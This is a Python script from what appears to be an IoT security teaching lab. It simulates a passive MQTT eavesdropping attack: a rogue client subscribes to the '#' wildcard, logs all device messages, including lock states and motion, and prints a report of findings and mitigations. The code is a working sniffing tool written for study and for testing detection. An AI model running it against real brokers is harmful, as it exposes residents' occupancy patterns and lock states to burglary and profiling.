# =============================================================================
# attacks/eavesdrop.py — MQTT Eavesdropping / Passive Sniffing Attack
# =============================================================================
# EDUCATIONAL PURPOSE ONLY — Do NOT run this against systems you don't own.
#
# This script simulates a passive eavesdropping attack where an attacker
# silently subscribes to ALL MQTT topics and harvests all device data.
#
# Why this is serious:
#   Without TLS encryption on MQTT (port 1883), ALL messages are cleartext.
#   An attacker on the same network can:
#     - Learn occupancy patterns (home/away based on motion data)
#     - See door lock states (burglary planning)
#     - Harvest device topology for further targeted attacks
#     - Build a profile for social engineering
#
# The '#' wildcard in MQTT subscribes to ALL topics simultaneously.
# An unauthorised client using '#' is a strong indicator of eavesdropping.
#
# MITRE ATT&CK ICS: T0887 - Wireless Sniffing
# =============================================================================

import paho.mqtt.client as mqtt
import json
import time
import sys
import os
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config

# ── ATTACKER IDENTITY ────────────────────────────────────────────────────────
# Not in the authorised devices list — will be flagged by detection engine
ATTACKER_CLIENT_ID = "rogue-listener-001"

# ── DATA COLLECTION ───────────────────────────────────────────────────────────
# The attacker collects this data silently during the eavesdrop session
collected_data = {
    "session_start": None,
    "total_messages": 0,
    "topics_seen": set(),
    "devices_seen": set(),
    "messages": []              # Store raw captured messages
}


# ─────────────────────────────────────────────────────────────────────────────
# CALLBACK: on_connect
# Called when connected. Immediately subscribes to ALL topics using '#'.
# ─────────────────────────────────────────────────────────────────────────────
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[Eavesdrop] ✅ Connected to broker")
        print("[Eavesdrop] 👂 Subscribing to ALL topics with '#' wildcard...")

        # '#' is the MQTT wildcard for ALL topics — highest privilege subscription
        # This single subscribe call captures every message on the broker
        client.subscribe("#", qos=0)
        print("[Eavesdrop] 🕵️  Now silently listening to all traffic...\n")
    else:
        print(f"[Eavesdrop] ❌ Connection failed (code {rc})")
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# CALLBACK: on_message
# Called for EVERY message on EVERY topic (because we subscribed to '#').
# The attacker logs all captured data here.
# ─────────────────────────────────────────────────────────────────────────────
def on_message(client, userdata, msg):
    collected_data["total_messages"] += 1
    collected_data["topics_seen"].add(msg.topic)

    # Decode payload from bytes to string
    try:
        payload_str = msg.payload.decode("utf-8")
        payload_obj = json.loads(payload_str)

        # Extract device ID if present in payload
        device_id = payload_obj.get("device_id", "unknown")
        collected_data["devices_seen"].add(device_id)

        # Store the captured message (what a real attacker would log)
        captured = {
            "captured_at": datetime.now().isoformat(),
            "topic":       msg.topic,
            "payload":     payload_obj
        }
        collected_data["messages"].append(captured)

        # ── DISPLAY: what the attacker sees ───────────────────────────────
        # Show each captured message with a "spy" aesthetic
        device_type = payload_obj.get("device_type", "unknown")
        timestamp   = datetime.now().strftime("%H:%M:%S")

        # Extract the most interesting field for display
        if "temperature" in payload_obj:
            interesting = f"TEMP={payload_obj['temperature']}°C"
        elif "state" in payload_obj:
            interesting = f"STATE={payload_obj['state']}"
        elif "triggered" in payload_obj:
            interesting = f"MOTION={payload_obj['triggered']}"
        elif "power" in payload_obj:
            interesting = f"LIGHT={payload_obj['power']}@{payload_obj.get('brightness',0)}%"
        else:
            interesting = "DATA_CAPTURED"

        print(f"  [{timestamp}] 📡 CAPTURED | "
              f"Topic: {msg.topic:<30} | "
              f"Device: {device_id:<20} | "
              f"{interesting}")

    except (json.JSONDecodeError, UnicodeDecodeError):
        # Non-JSON payload — still log it (could be binary protocol data)
        print(f"  [CAPTURED] Topic: {msg.topic} | Raw bytes: {msg.payload[:50]}")


def on_disconnect(client, userdata, rc):
    print(f"\n[Eavesdrop] 🔌 Disconnected (code {rc})")


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION: print_harvest_report
# At the end of the session, show what an attacker has learned.
# This illustrates the PRIVACY IMPACT of unencrypted MQTT.
# ─────────────────────────────────────────────────────────────────────────────
def print_harvest_report(duration):
    print("\n" + "=" * 65)
    print("  🗂️  EAVESDROP SESSION REPORT — What the attacker learned:")
    print("=" * 65)
    print(f"  Session Duration  : {duration:.0f} seconds")
    print(f"  Messages Captured : {collected_data['total_messages']}")
    print(f"  Unique Topics     : {len(collected_data['topics_seen'])}")
    print(f"  Devices Discovered: {len(collected_data['devices_seen'])}")

    print("\n  📋 Topics observed:")
    for topic in sorted(collected_data["topics_seen"]):
        count = sum(1 for m in collected_data["messages"] if m["topic"] == topic)
        print(f"    • {topic}  ({count} messages)")

    print("\n  🖥️  Devices identified:")
    for device in sorted(collected_data["devices_seen"]):
        print(f"    • {device}")

    print("\n  🔓 SECURITY FINDINGS:")
    print("    ✗ All MQTT traffic is UNENCRYPTED (cleartext on port 1883)")
    print("    ✗ No authentication required to subscribe to any topic")
    print("    ✗ Wildcard '#' subscription grants access to all device data")
    print("    ✗ Occupancy patterns, device states, timestamps exposed")

    print("\n  🛡️  MITIGATIONS:")
    print("    ✓ Enable TLS on port 8883 (MQTTS)")
    print("    ✓ Require username/password authentication")
    print("    ✓ Use ACLs to restrict topic subscriptions per client")
    print("    ✓ Enable MQTT v5 enhanced authentication")
    print("=" * 65 + "\n")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "=" * 60)
    print("  👂 MQTT EAVESDROPPING ATTACK SIMULATION")
    print("=" * 60)
    print(f"  Target Broker  : {config.BROKER_HOST}:{config.BROKER_PORT}")
    print(f"  Subscription   : # (ALL topics)")
    print(f"  Attacker ID    : {ATTACKER_CLIENT_ID}")
    print("  Mode           : PASSIVE (listen only — not detectable by devices)")
    print("=" * 60)
    print("  ⚠️  This will trigger LOW/MEDIUM alerts in the monitor")
    print("  📚 Demonstrates risk of unencrypted MQTT (port 1883)")
    print("=" * 60 + "\n")

    # How long to eavesdrop (default: 60 seconds — enough to see all device types)
    eavesdrop_duration = 60
    print(f"[Eavesdrop] Will listen for {eavesdrop_duration} seconds...")
    print("[Eavesdrop] Press Ctrl+C to stop early.\n")

    client = mqtt.Client(client_id=ATTACKER_CLIENT_ID)
    client.on_connect    = on_connect
    client.on_message    = on_message
    client.on_disconnect = on_disconnect

    try:
        client.connect(config.BROKER_HOST, config.BROKER_PORT, config.BROKER_KEEPALIVE)
    except ConnectionRefusedError:
        print("[Eavesdrop] ❌ Broker not reachable.")
        sys.exit(1)

    collected_data["session_start"] = time.time()

    try:
        # loop_forever() blocks here, calling on_message for each received msg
        # We use a timed version that will exit after the duration
        client.loop_start()
        time.sleep(eavesdrop_duration)

    except KeyboardInterrupt:
        print("\n[Eavesdrop] ⏹  Stopped by user")

    actual_duration = time.time() - collected_data["session_start"]

    client.loop_stop()
    client.disconnect()

    print_harvest_report(actual_duration)


if __name__ == "__main__":
    main()
